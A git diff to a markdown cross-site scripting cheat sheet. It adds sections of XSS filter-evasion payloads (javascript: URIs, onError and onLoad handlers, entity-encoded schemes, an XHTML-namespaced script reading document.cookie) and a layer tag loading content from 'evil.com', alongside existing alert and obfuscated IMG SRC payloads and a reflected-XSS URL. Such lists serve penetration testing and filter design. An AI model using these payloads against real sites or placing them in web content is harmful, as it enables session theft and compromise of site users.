@@ -1,6 +1,8 @@
 # XSS (CROSS SITE SCRIPTING)
 
-```javascript
+Payloads
+--------
+```
 <script>alert("XSS")</script>
 <script>alert('XSS')</script>
 <script>alert(123123)</script>
@@ -11,6 +13,16 @@ iframe: `<iframe src="http://www.cnn.com"></iframe>`
 Stored cookie: `<script>alert(document.cookie)</script>`  
 Reflected (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`
 
+```
+<body background="javascript:alert('running in background');">
+<iframe src="javascript:alert('Hello');“/>
+<input type=image src="&#74;avascript:alert('Have You')">
+<img src='iamnothere.gif' onError=”alert('EventHandler')">
+<frameset onLoad="alert('EventHandler')">
+<layer name="extern" src="http://evil.com/test.html">
+```
+
+* [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
 [Cheatsheet](http://ha.ckers.org/xss.html)
 ------------------------------------------
@@ -45,6 +57,16 @@ Other:
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+```
+
+XSS and XML
+-----------
+```
+<html:html xmlns:html='http://www.w3.org/1999/xhtml'>
+  <html:script>
+      alert(document.cookie);
+  </html:script>
+</html:html>
 ```
 
 Misc
